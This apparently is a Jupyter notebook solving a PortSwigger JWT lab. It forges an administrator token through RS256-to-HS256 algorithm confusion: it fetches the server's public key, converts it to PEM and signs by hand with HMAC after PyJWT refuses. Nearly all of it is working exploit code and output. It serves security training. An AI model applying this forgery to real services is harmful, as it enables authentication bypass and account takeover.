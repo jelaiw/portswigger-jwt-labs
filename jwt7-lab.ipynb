{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Obtain server public key\n",
    "See https://portswigger.net/web-security/jwt/algorithm-confusion.\n",
    "\n",
    "The `jwks_json` string is `jwks.json` served from the root of the lab web server."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "jwks_json = '{\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"use\":\"sig\",\"kid\":\"f2cfad7d-28af-406b-90fc-c45e31efe7c8\",\"alg\":\"RS256\",\"n\":\"p8xzHe3muuc_O97dEgnu725qGezv_F751wKfypCuVgKcIz6W0Iuw7HK6Uzxqlw3La-QWYLMDz4fszDoihgT9ZcsbQqfZRDybm4fvpnpm-m8uO45vdyJWio4P_mblTjccSXs_nchCBZU1xnoEazQM-rIYZD7XSgex3hEE2hc-ZedEQooTfLAEU6hYAiyueGEvl2VSH51CArhbORFkeRJVY5z4c06y2TWKQwpaOu60KedlnEM-YIOO79N_kirlyHO2ISQZe9tQbJd3rEnr3yjSTEz5wViTE4N044V5oyUrsmJGG1HE8J2r48W7UgfpynIhjKTrwnOwsS3aM4s87-E8qQ\"}]}'"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Convert public key to PEM format"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'keys': [{'kty': 'RSA',\n",
       "   'e': 'AQAB',\n",
       "   'use': 'sig',\n",
       "   'kid': 'f2cfad7d-28af-406b-90fc-c45e31efe7c8',\n",
       "   'alg': 'RS256',\n",
       "   'n': 'p8xzHe3muuc_O97dEgnu725qGezv_F751wKfypCuVgKcIz6W0Iuw7HK6Uzxqlw3La-QWYLMDz4fszDoihgT9ZcsbQqfZRDybm4fvpnpm-m8uO45vdyJWio4P_mblTjccSXs_nchCBZU1xnoEazQM-rIYZD7XSgex3hEE2hc-ZedEQooTfLAEU6hYAiyueGEvl2VSH51CArhbORFkeRJVY5z4c06y2TWKQwpaOu60KedlnEM-YIOO79N_kirlyHO2ISQZe9tQbJd3rEnr3yjSTEz5wViTE4N044V5oyUrsmJGG1HE8J2r48W7UgfpynIhjKTrwnOwsS3aM4s87-E8qQ'}]}"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "jwks = json.loads(jwks_json)\n",
    "jwks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# jwk.JWK.from_json() needs kty parameter to be defined.\n",
    "jwks['keys'][0]['kty'] = \"RSA\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'kty': 'RSA',\n",
       " 'e': 'AQAB',\n",
       " 'use': 'sig',\n",
       " 'kid': 'f2cfad7d-28af-406b-90fc-c45e31efe7c8',\n",
       " 'alg': 'RS256',\n",
       " 'n': 'p8xzHe3muuc_O97dEgnu725qGezv_F751wKfypCuVgKcIz6W0Iuw7HK6Uzxqlw3La-QWYLMDz4fszDoihgT9ZcsbQqfZRDybm4fvpnpm-m8uO45vdyJWio4P_mblTjccSXs_nchCBZU1xnoEazQM-rIYZD7XSgex3hEE2hc-ZedEQooTfLAEU6hYAiyueGEvl2VSH51CArhbORFkeRJVY5z4c06y2TWKQwpaOu60KedlnEM-YIOO79N_kirlyHO2ISQZe9tQbJd3rEnr3yjSTEz5wViTE4N044V5oyUrsmJGG1HE8J2r48W7UgfpynIhjKTrwnOwsS3aM4s87-E8qQ'}"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "jwks['keys'][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "from jwcrypto import jwk"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "key = jwk.JWK.from_json(json.dumps(jwks['keys'][0]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp8xzHe3muuc/O97dEgnu\\n725qGezv/F751wKfypCuVgKcIz6W0Iuw7HK6Uzxqlw3La+QWYLMDz4fszDoihgT9\\nZcsbQqfZRDybm4fvpnpm+m8uO45vdyJWio4P/mblTjccSXs/nchCBZU1xnoEazQM\\n+rIYZD7XSgex3hEE2hc+ZedEQooTfLAEU6hYAiyueGEvl2VSH51CArhbORFkeRJV\\nY5z4c06y2TWKQwpaOu60KedlnEM+YIOO79N/kirlyHO2ISQZe9tQbJd3rEnr3yjS\\nTEz5wViTE4N044V5oyUrsmJGG1HE8J2r48W7UgfpynIhjKTrwnOwsS3aM4s87+E8\\nqQIDAQAB\\n-----END PUBLIC KEY-----\\n'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pem = key.export_to_pem()\n",
    "pem"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create malicious JWT\n",
    "Modify payload and set `alg` header."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "headers = {\n",
    "    \"kid\": \"f2cfad7d-28af-406b-90fc-c45e31efe7c8\",\n",
    "    \"alg\": \"HS256\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = {\n",
    "    \"iss\": \"portswigger\",\n",
    "    \"sub\": \"administrator\",\n",
    "    \"exp\": 1684346314\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import jwt"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Looks like PyJWT can detect when you try to sign a JWT with a questionable HMAC secret. :-D"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "ename": "InvalidKeyError",
     "evalue": "The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mInvalidKeyError\u001b[0m                           Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[12], line 1\u001b[0m\n\u001b[0;32m----> 1\u001b[0m encoded \u001b[39m=\u001b[39m jwt\u001b[39m.\u001b[39;49mencode(payload, pem, headers\u001b[39m=\u001b[39;49mheaders, algorithm\u001b[39m=\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39mHS256\u001b[39;49m\u001b[39m\"\u001b[39;49m)\n",
      "File \u001b[0;32m~/.python/current/lib/python3.10/site-packages/jwt/api_jwt.py:73\u001b[0m, in \u001b[0;36mPyJWT.encode\u001b[0;34m(self, payload, key, algorithm, headers, json_encoder, sort_headers)\u001b[0m\n\u001b[1;32m     65\u001b[0m         payload[time_claim] \u001b[39m=\u001b[39m timegm(payload[time_claim]\u001b[39m.\u001b[39mutctimetuple())\n\u001b[1;32m     67\u001b[0m json_payload \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_encode_payload(\n\u001b[1;32m     68\u001b[0m     payload,\n\u001b[1;32m     69\u001b[0m     headers\u001b[39m=\u001b[39mheaders,\n\u001b[1;32m     70\u001b[0m     json_encoder\u001b[39m=\u001b[39mjson_encoder,\n\u001b[1;32m     71\u001b[0m )\n\u001b[0;32m---> 73\u001b[0m \u001b[39mreturn\u001b[39;00m api_jws\u001b[39m.\u001b[39;49mencode(\n\u001b[1;32m     74\u001b[0m     json_payload,\n\u001b[1;32m     75\u001b[0m     key,\n\u001b[1;32m     76\u001b[0m     algorithm,\n\u001b[1;32m     77\u001b[0m     headers,\n\u001b[1;32m     78\u001b[0m     json_encoder,\n\u001b[1;32m     79\u001b[0m     sort_headers\u001b[39m=\u001b[39;49msort_headers,\n\u001b[1;32m     80\u001b[0m )\n",
      "File \u001b[0;32m~/.python/current/lib/python3.10/site-packages/jwt/api_jws.py:160\u001b[0m, in \u001b[0;36mPyJWS.encode\u001b[0;34m(self, payload, key, algorithm, headers, json_encoder, is_payload_detached, sort_headers)\u001b[0m\n\u001b[1;32m    157\u001b[0m signing_input \u001b[39m=\u001b[39m \u001b[39mb\u001b[39m\u001b[39m\"\u001b[39m\u001b[39m.\u001b[39m\u001b[39m\"\u001b[39m\u001b[39m.\u001b[39mjoin(segments)\n\u001b[1;32m    159\u001b[0m alg_obj \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mget_algorithm_by_name(algorithm_)\n\u001b[0;32m--> 160\u001b[0m key \u001b[39m=\u001b[39m alg_obj\u001b[39m.\u001b[39;49mprepare_key(key)\n\u001b[1;32m    161\u001b[0m signature \u001b[39m=\u001b[39m alg_obj\u001b[39m.\u001b[39msign(signing_input, key)\n\u001b[1;32m    163\u001b[0m segments\u001b[39m.\u001b[39mappend(base64url_encode(signature))\n",
      "File \u001b[0;32m~/.python/current/lib/python3.10/site-packages/jwt/algorithms.py:268\u001b[0m, in \u001b[0;36mHMACAlgorithm.prepare_key\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    265\u001b[0m key_bytes \u001b[39m=\u001b[39m force_bytes(key)\n\u001b[1;32m    267\u001b[0m \u001b[39mif\u001b[39;00m is_pem_format(key_bytes) \u001b[39mor\u001b[39;00m is_ssh_key(key_bytes):\n\u001b[0;32m--> 268\u001b[0m     \u001b[39mraise\u001b[39;00m InvalidKeyError(\n\u001b[1;32m    269\u001b[0m         \u001b[39m\"\u001b[39m\u001b[39mThe specified key is an asymmetric key or x509 certificate and\u001b[39m\u001b[39m\"\u001b[39m\n\u001b[1;32m    270\u001b[0m         \u001b[39m\"\u001b[39m\u001b[39m should not be used as an HMAC secret.\u001b[39m\u001b[39m\"\u001b[39m\n\u001b[1;32m    271\u001b[0m     )\n\u001b[1;32m    273\u001b[0m \u001b[39mreturn\u001b[39;00m key_bytes\n",
      "\u001b[0;31mInvalidKeyError\u001b[0m: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret."
     ]
    }
   ],
   "source": [
    "encoded = jwt.encode(payload, pem, headers=headers, algorithm=\"HS256\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Guess we need to put together the malicious JWT \"by hand\" then."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'{\"kid\": \"f2cfad7d-28af-406b-90fc-c45e31efe7c8\", \"alg\": \"HS256\"}'"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "headers_json = json.dumps(headers).encode()\n",
    "headers_json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'{\"iss\": \"portswigger\", \"sub\": \"administrator\", \"exp\": 1684346314}'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload_json = json.dumps(payload).encode()\n",
    "payload_json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "DELIMITER = b'.'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'eyJraWQiOiAiZjJjZmFkN2QtMjhhZi00MDZiLTkwZmMtYzQ1ZTMxZWZlN2M4IiwgImFsZyI6ICJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogImFkbWluaXN0cmF0b3IiLCAiZXhwIjogMTY4NDM0NjMxNH0='"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data = base64.urlsafe_b64encode(headers_json) + DELIMITER + base64.urlsafe_b64encode(payload_json)\n",
    "data\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Sign the JWT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "import hmac"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'kV\\xf3\\xbbz\\x1a\\xf1\\xd7\\xfb\\xbc \\x8by\\xd0\\xa5z\\xddz\\x1fq\\x00\\xa0Pn\\x04.\\x06U\\xbf\\xce\\xfbz'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "digest = hmac.new(pem, msg=data, digestmod='sha256').digest()\n",
    "digest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'a1bzu3oa8df7vCCLedClet16H3EAoFBuBC4GVb_O-3o'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tag = base64.urlsafe_b64encode(digest).rstrip(b'=') # Note we strip trailing padding chars.\n",
    "tag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'eyJraWQiOiAiZjJjZmFkN2QtMjhhZi00MDZiLTkwZmMtYzQ1ZTMxZWZlN2M4IiwgImFsZyI6ICJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogImFkbWluaXN0cmF0b3IiLCAiZXhwIjogMTY4NDM0NjMxNH0=.a1bzu3oa8df7vCCLedClet16H3EAoFBuBC4GVb_O-3o'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "jwt_encoded = data + DELIMITER + tag\n",
    "jwt_encoded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
